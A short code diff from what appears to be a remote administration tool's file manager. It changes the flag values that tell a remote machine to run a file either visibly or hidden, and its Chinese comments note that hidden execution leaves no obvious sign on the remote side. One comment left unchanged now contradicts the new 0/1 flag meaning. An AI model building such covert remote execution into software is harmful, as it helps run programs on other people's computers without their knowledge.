@@ -520,14 +520,14 @@ void CFileManage::OnRButtonDown(UINT nFlags, CPoint point)
 
 void CFileManage::OnFileExecute()
 {
-     fileExecute(100); // 正数表示正常运行不隐藏   运行时候会产生cmd窗口
+     fileExecute(0); // 0表示正常运行不隐藏   运行时候会产生cmd窗口
 }
 
 
 void CFileManage::OnFileExecuteHide()
 {
 	// TODO: 在此添加命令处理程序代码
-	fileExecute(-100);   //负数表示隐藏运行   运行时服务端无明显反应
+	fileExecute(1);   //1表示隐藏运行   运行时服务端无明显反应
 }
 
 void CFileManage::fileExecute(int hide){
@@ -543,7 +543,7 @@ void CFileManage::fileExecute(int hide){
 		}
 		m_MsgHead.dwCmd  = CMD_FILE_EXECUTE;
 		m_MsgHead.dwSize = strlen(pBuffer);
-		m_MsgHead.dwExtend1 = (DWORD)hide;//随便取一个大于0的值表示正常运行不隐藏
+		m_MsgHead.dwExtend1 = hide;//随便取一个大于0的值表示正常运行不隐藏
 		//数据传输同时接收数据
 		if( !SendMsg(m_ConnSocket, pBuffer, &m_MsgHead))
 		{
